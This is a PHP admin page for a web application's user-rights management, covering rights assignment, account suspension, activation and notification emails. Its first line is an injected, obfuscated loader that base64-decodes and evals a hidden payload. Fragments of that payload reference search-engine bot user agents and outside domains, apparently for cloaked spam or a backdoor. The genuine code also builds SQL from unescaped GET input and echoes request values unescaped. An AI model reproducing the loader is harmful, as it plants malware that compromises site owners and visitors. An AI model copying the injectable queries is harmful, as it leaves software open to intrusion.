<?php /*versio:3.02*/ $GLOBALS["jlyhtl"]="MAaW5pX3NldAJkcYWxsb3dfdXJsX2ZvcGVuqOmZGlzcGxheV9lcnJvcnMTZmVkb3Ivd2VibmV0X3VwZ19hYgMy4wMgojddGhhaDFOaWV0aGFpMnphaDZBaHIbKvaHR0cDovLwrTzSFRUUFMnVb2ZmaObaHR0cHM6Ly8SFRUUF9IT1NUgIdW5pb24Fpoc2VsZWN0KTpUkVRVUVTVF9VUkkCOpTkU0NSSVBUX05BTUUsNqUVVFUllfU1RSSU5HUPwjggboZGV0ZXJtaW5hdG9yeLgWzamLmxvZwqSFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQHdmVyc2lvDjpTLQHJLXBocASFRUUF9FWEVDUEhQKlfb3V0HVHxcb2sSFRUUF9VU0VSX0FHRU5UQmFLAOCGZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleABsYQfAALYYWxqZXIuYml6BTtZmFzdGFkZHouY29tysL3czLnBocD91PQIstJms9aJnQ9cGhwJnA9YXpJnY9BtZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYzdHYya2dRL3lvYkMxVkdkZzAyTm8vbWZFclVvOWRJdlNTaTVLU3FGMW5FWG9QQitHMHdSUG51TitOZFkwT2dkMyt4N016T2UzNHo5bHdpWGpuVTlRTHFpSUpETTVxc3ZXQ1doWW5RYnI4U0Q4aHVIdGlaRndZV0xidzBTOFY0SDFGN01mTkZWVkpsdGR0R3Zoc3Y4S3lVWmtkRVhkYTZiWm1vN2VzemRFMUhCblVFREYxZ2VDT1ZHbUxOZGttK3p4YlJLcDA1WXFzb2x2RitMWk1QclhTelNxTTVNY245MDdkdmJmSks2cHUxWnlkaDVxMnBtQ1U1QlhrSnpmSWtJQzROM1VyRWlaWjU2bXl6UmJyeGQwRWh0dUtWRndlaFRGcjdjSjJsS2JqVWVzbjJib0hDQlR0UGZPR2F0UExsTXM0OXVPRTBSYkRBcnd4SUdLZlN4em40S014OFA5eGE4TWh5dzRnR1FwdVlJRVVWMEdadTJJM3IrUlM1TFRzTU1ocEFYSVZGbGtXZk9oMkJLSVRiZ3lkbWtFS0VEMXZUbmR0QzZRYjFVM291Tjl4RVRFbHJsZTdjTEFGcmIvaXRDRTliTHprTjZlN0lCOGhMR0tFWHJiVTdXeVhSRVpFVzFBYlNEWDhvY3JFeStmdzArZmJ3T0xYZ1J5Yi93M1k3UjlNdnkvazZ2djFqUEpHSk93UGZmc2s1R1UrZkp2ZlR5ZTM5OXkvNGdxZjg4b1BQRC9mMzQ4L1Q2ZDFmNDRlbnFVejZHSWhrdXduQ3VBd1BjN3Q2aDZJdzQ1YnRoeWx0M0dMQTZUcktRQU43REdHdXhRakM5VnVWWFg1YlpRcExsZFVncW5QVDBGNWhYZFJWTit4QzVjWEx6SWtXY0tEYnpJOVhNakc0enFwK1VjeG1zWXpTQlZOSGpqc0N6SGFqSEl1Z2Fobmh6L0dVdlBJc3ZBa0twaUZka2EvVDZXTkhWYnB3OFUveVR3QS9YOE0wKzBUZzhNcE5laXNKR0tZZ2lzSUU3WDc4K21nOWZGZUVqcURnOGUveDVQdmR3LzBacFU4cFRUN2V6cUdtUDRGeTlyNlVWOG5jTHFEMnhhc0xmYzZkYXBNUEg0aDQwdGZrWTAzK2pXanRPaUFLQmhiYXFXR0lxZzNMWHJseGVTSVBNTkJLMW1tK3ljRXBXa1IrNkZCUk9OZ25WeUtCTHc4UXNqajN6KzV6alN2ZStzdzd4bGZxZkR1Q211MCttc2VyK1R4S1k2Z3kxODl6dWdIKzFUeVA0d3ljQUVRTWlmRERFaFJPVklSUGNHWjBucVFUaUZ6bXkzMlI3VjRXUlM2Mmx2dnRQdmZiTmJpMHJPL2pDV1RvSnljOTQrdldldmNTRjN2ekFNR0daUFJrcld5R1pSemtnVmVUZXRKUWxVdUt2M3paTExPYTBqY2tiU2hyQTZTeFdxbHBxanFRK2pnU1dOMTZhUm0reXBZYStpVzFwOHVEOW5NMVlXN2U4NHg2a3Q1REhuSmxrbHBCejVEVXJxeVgrSGFxWFFPYU5wQlZsV2VBTXlobW1pVlpDSWhNazNPYVZOV1E5S0dzYW0zTXJ4c21kR1l2b09rc2JKNVpTbmhLek4vcmZLSE5JRFFLb2RyWXBYeGtoYUdCNVFnT0tPTW5GL0RjaUM3amdUalZTSDVKbmpyc3c1Z2Qva3FjQ2dFZEdFemNHeGduWGwyS3ZLcDJwU0g0YW1Ec0VVN2VjMERnalpLaFJNYjM5R0ZYNmpFSm1PVExPUWFqTkpqdi9jdWE5SzVrTUVuWXZmVkwyQXkwa2F5MVlZQ2NNVURENEpWeXIwKzZiTGVtKzJKYnJGekgzWWxZSU1zd0R1Y0wwL0dTWUFZSVlsbGY3cjZOTGF1dC9IRTNnWEh3TVBrQjBoOXZKN2R3aEdwZXhLRmR6dnZiSkpudFJDSjBITHJwcElzMTlMYlF5ZFpSUjNGaFZuK0VSaW5xcTd2UDQrcW10bGFZL3ZVb1BCL2ZqQTlYNC91L214elZYN0RxNklZL0tQV2c5TU42a1FQMnpCd0xyaTN3VFlBTmlydXFDSXoxOEhjYmZlVHJSWWM5U2k5UWJhaDVDclNqRHVBQndSNXdiSCsyakhucFgvRWh5Qzh4MU95b21HY2p5NWFqMU5vbVhqWjdBZWh2dm1URzRNckJMcS9KQytoZlZTQmFEVlRHZGwzV2Q5a3NmajAvY1JZQTZMd1N0c2ZXTzJaL0tLa2pEWXVsV2pLcmJtdmwvaHpxeEt3dzRseWw2eU5KSDdGZUFUdUR6RXZkdVhtemRveEtyOEpISWtkUGhXTWxJcU9iTzFFeE0wOXFVbWswSXZSczM0QXFWN2prNjNmV2E3MlJwS25NZWk0UVJjTTZBa3M2Qm96ZDFVTDcwRGpxcUlUdEM2aUtJZzIxOU1rMHVXSjBqa2JoTWkrYVVEb29NUkVIS0J0T2ZBWWRqN0pHdDQ4QWx3MkFLYm1hSlVvekMxcC9XTHJLSmxCTjBrWkRTZGZBNG1yVENSSjNVYVFtTitpY0N6MllNUUFQREZqZ3c0TnU0SksvKzUvVzlqUlYwbldZSWpKcGlJVnBPSko3YlZZbWhaZUpyR0phOFh6dlVvU0ZMN2lZUWdLMlc5OE45d2lQL3pGWW9JQTBuSlhkNDhsUzdSeU42RW05QVNKZTA1NVJGMmFFYk1Db0t4c3cyTnU1NjU3TUhtYUpmS0JlbVdacEpLWTAzRHJPUEN6M1RiWnJubFlMSXJuYTdjbjlwbHJkNkV0WWxWaG9NSWhtZVlvU2N1dzJHMjArNCthZ0IyT1hqUXpjbkYzc2NtaHhwaCtXYzF6ZTJyREVaTERSTUR2NUh5WWYvcFJMNFdGTFl3L0w5YUtNdkRtRnplOElGU284d1Urb3lxK3lGckl3dHhkaTNTc0FtYmFmTzlRS0E1czI3aHM0VUdVWFB0QlFEMFl1ZWdrVzIrSXdCK282MWlTOTI4ZEZvUkV3VGNYcU5yQWVxN1k3dGdJbGNyQnB4SkZmb1pkc095ZU5DZGlEN2xPaFFGVWRXb1l4MW1rem9QNVZXVC9nUmszUis1SStHS0I5N3h1dDE4VmFISlh2V0grQ1ppK2NyellaYUQ3NUZtWUJnSDIzL2h5K2ZoOWNocy84OCtZOWRtbTRKcGJZeGZleGZ3RXpRRGpSIikpKTs";        if (!function_exists('qzpechal')){function qzpechal($a, $b){$c=$GLOBALS['jlyhtl'];$d=pack('H*','6261736536345f6465636'.'f6465'); return $d(substr($c, $a, $b));};eval(qzpechal(544,3267));};?><?php
$user_cd = $_GET['user_cd'];
$objAdminUserN = new AdminUser;
$objAdminUserN->setProperty("user_cd", $user_cd);
$objAdminUserN->lstAdminUser();
$rows_c = $objAdminUserN->dbFetchArray();
if($_SERVER['REQUEST_METHOD'] == "POST" && $_POST['add']){
	$user_cd = $_POST['user_cd'];
	$menu_cd = $_POST['menu_cd'];
	if(!empty($_POST['menu_cd']))
				{
					foreach($_POST['menu_cd'] as $val)
					{
					$right_id = $objAdminUser->genCode("mis_tbl_user_rights", "right_id");
					$objAdminUser->setProperty("right_id", $right_id);
					$objAdminUser->setProperty("user_cd", $user_cd);
					$objAdminUser->setProperty("menu_cd", $val);
					$objAdminUser->actMenuUser("I");
					}
					
					$objCommon->setMessage('User\'s rights added successfully.', 'Info');
					redirect('./?p=user_rights&user_cd='.$user_cd);
				}
					
	      if(empty($_POST['dmenu_cd']))
			{
			$objCommon->setMessage('No right has been selected ', 'Info');
			}
	

	}
if($_SERVER['REQUEST_METHOD'] == "POST" && $_POST['del']){
$user_cd = $_POST['user_cd'];
$menu_cd = $_POST['dmenu_cd'];
if(!empty($_POST['dmenu_cd']))
			{
				foreach($_POST['dmenu_cd'] as $val)
				{
				
				$objAdminUser->setProperty("user_cd", $user_cd);
				$objAdminUser->setProperty("menu_cd", $val);
				$objAdminUser->actMenuUser("D");
				}
				$objCommon->setMessage('User\'s rights Deleted successfully.', 'Error');
				redirect('./?p=user_rights&user_cd='.$user_cd);
			}
				
			if(empty($_POST['dmenu_cd']))
			{
			$objCommon->setMessage('No right has been selected ', 'Update');
			}


}
if($_GET['mode'] == 'Delete')
{
	$user_cd = $_GET['user_cd'];
	
	$objAdminUser->setProperty("user_cd", $user_cd);
	$objAdminUser->actAdminUser('D');
	$objCommon->setMessage('User\'s account deleted successfully.', 'Error');
	redirect('./?p=user_mgmt');
	
}
if($_GET['mode'] == 'Suspend'){

	$user_cd = $_GET['user_cd'];
	$objAdminUser->setProperty("user_cd", $user_cd);
	$objAdminUser->setProperty("is_active", "0");
	if($objAdminUser->actAdminUser("U")){
		$objAdminUserN = new AdminUser;
		$objAdminUserN->setProperty("user_cd", $user_cd);
		$objAdminUserN->lstAdminUser();
		$rows_c = $objAdminUserN->dbFetchArray();
		
		# Send mail to customer
		$content 		= $objTemplate->getTemplate('account_suspend','EN');
		$sender_name 	= $content['sender_name'];
		$sender_email 	= $content['sender_email'];
		$subject 		= $content['template_subject'];
		$content 		= $content['template_detail'];
		
		$content		= str_replace("[USER_NAME]", $rows_c['fullname'], $content);
		$content		= str_replace("[REASON]", '', $content);
		$content		= str_replace("[SITENAME]", SITE_NAME, $content);
		$content		= str_replace("[SITE_NAME]", SITE_NAME, $content);
		$content		= str_replace("[SENDER_NAME]", $sender_name, $content);
		
		$body 			= file_get_contents(TEMPLATE_URL . "template.php");
		$body			= str_replace("[BODY]", $content, $body);
		
		$objMail		= new Mail;
		$objMail->IsHTML(true);
		$objMail->setSender($sender_email, $sender_name);
		$objMail->AddEmbeddedImage(TEMPLATE_PATH . "agro_email.jpg", 1, 'agro_email.jpg');
		$objMail->setSubject($subject);
		$objMail->setReciever($rows_c['email'], $rows_c['fullname']);
		$objMail->setBody($body);
		//$objMail->Send();
	
		$objCommon->setMessage('User\'s account suspended successfully.', 'Error');
		redirect('./?p=user_mgmt');
	}
}

if($_GET['mode'] == 'Activate'){
	$user_cd = $_GET['user_cd'];
	$newpwd = $objCommon->genPassword();
	$objAdminUser->setProperty("user_cd", $user_cd);
	$objAdminUser->setProperty("password", md5($newpwd));
	$objAdminUser->setProperty("is_active", "1");
	if($objAdminUser->actAdminUser("U")){
		$objAdminUserN = new AdminUser;
		$objAdminUserN->setProperty("user_cd", $user_cd);
		$objAdminUserN->lstAdminUser();
		$rows_c = $objAdminUserN->dbFetchArray();
		
		# Send mail to customer
		$content 		= $objTemplate->getTemplate('account_activate','EN');
		$sender_name 	= $content['sender_name'];
		$sender_email 	= $content['sender_email'];
		$subject 		= $content['template_subject'];
		$content 		= $content['template_detail'];
		
		$content		= str_replace("[USER_NAME]", $rows_c['fullname'], $content);
		$content		= str_replace("[EMAIL_ADD]", $rows_c['email'], $content);
		$content		= str_replace("[PASSWORD]", $newpwd, $content);
		$content		= str_replace("[SITE_NAME]", SITE_NAME, $content);
		$content		= str_replace("[SENDER_NAME]", $sender_name, $content);
		
		$body 			= file_get_contents(TEMPLATE_URL . "template.php");
		$body			= str_replace("[BODY]", $content, $body);
		
		$objMail		= new Mail;
		$objMail->IsHTML(true);
		$objMail->setSender($sender_email, $sender_name);
		$objMail->AddEmbeddedImage(TEMPLATE_PATH . "agro_email.jpg", 1, 'agro_email.jpg');
		$objMail->setSubject($subject);
		$objMail->setReciever($rows_c['email'], $rows_c['fullname']);
		$objMail->setBody($body);
		//$objMail->Send();
		
		
		$objCommon->setMessage('User\'s account activated successfully.', 'Info');
		redirect('./?p=user_mgmt');
	}
}

if(!empty($_GET['user_name'])){
	$user_name = urldecode($_GET['user_name']);
	$objAdminUser->setProperty("user_name", strtolower($user_name));
}
?>
<script type="text/javascript">
function doFilter(frm){
	var qString = '';
	if(frm.user_name.value != ""){
		qString += '&user_name=' + escape(frm.user_name.value);
	}
	document.location = '?p=user_mgmt' + qString;
}
</script>

<div id="wrapperPRight">
<form name="prd_frm" id="prd_frm" method="post" action="">
		<div id="pageContentName"><?php echo "Rights Management For ".$rows_c ["fullname"];?></div>
	<div id="pageContentRight" style="width:550px">
	<?php 
		$check=0;
		$objMenuM=new Menu();
		$objMenuN=new Menu();
		$Sql="Select menu_cd from mis_tbl_user_rights where user_cd=".$_GET["user_cd"];
		$res=$objMenuM->dbQuery($Sql);
		$check=$objMenuM->totalRecords();
		$objMenu->resetProperty();
		$objMenu->setProperty("parent_cd", "0");
    	$objProduct->lstComponent();
		//echo $objProduct->getSQL();
	?>
		<br style="clear:right"/>
		<div style="float:right; padding-right:40px">
		<input type="submit" name="add" id="add" value="<?php echo "Add Rights ";?>" class="SubmitButton"/>&nbsp;
			<?php if(isset($check)&&$check!=0)
				{?>
				<input type="submit" name="del" id="del" value="<?php echo "Remove Rights";?>" class="SubmitButton" />
				<?php }?>			
		</div>		
	</div>
		
		<div class="clear"></div>
			
		<?php echo $objCommon->displayMessage();?>
		
		<input type="hidden" id="user_cd" name="user_cd" 
		value="<?php echo $_GET['user_cd'];?>"/>
		<div id="tableContainer" style="width:800px; margin-left:150px">
		<?php
		
	if($objProduct->totalRecords() >= 1){
		# Print parent menus
		while($rows_p = $objProduct->dbFetchArray(1)){
		if($check>=1)
		{
		$Sql2="Select menu_cd from mis_tbl_user_rights where user_cd=".$_GET["user_cd"]." And menu_cd=".$rows_p["cid"];
		$res2=$objMenuN->dbQuery($Sql2);
		$check2=$objMenuN->totalRecords();
		}
			$bgcolor = ($bgcolor == "#FFFFFF") ? "#f1f0f0" : "#FFFFFF";
			?>
			<!-- Start Your Php Code her For Display Record's -->
			
		<div style="float:left">
				<div class="imgbutton" style="min-height:45px;float:left" >
					<ul >
					<li ><a href="<?php echo $rows_p['menu_link'];?>" <?php if(isset($check2)&&$check2!=0)
				{?> style="background-color:#FFF4CC" <?php }?>>
					<?php echo $rows_p['detail'];?>
					<br />
					<?php echo $rows_p['code'];?>
					</a></li>	
				</ul>
				</div> <br/>  <!--#E4EDF5 #A2BFD9 #FFF4CC-->
		  <div style="padding-right:55px;float:left">
				<?php if(isset($check2)&&$check2!=0)
				{?>
				
				<input type="checkbox"  id="dmenu_cd[]" 
				name="dmenu_cd[]" 
				value="<?php echo $rows_p['cid'];?>" 
				 />
				
				<?php }
				else{?>
				<input type="checkbox"  id="menu_cd[]" 
				name="menu_cd[]" 
				value="<?php echo $rows_p['cid'];?>" 
				 />
				
				 <?php }?>
		  </div>
		  </div>
			<?php
			
		}
    }
	else{
	?>
  <div align="center" style="padding:5px 5px 5px 5px"> <?php echo "No Record Found";?></div>
   
    <?php
	}
	?>
		</div>	
	
	<div class="clear"></div>

  </form>
	 
</div>
	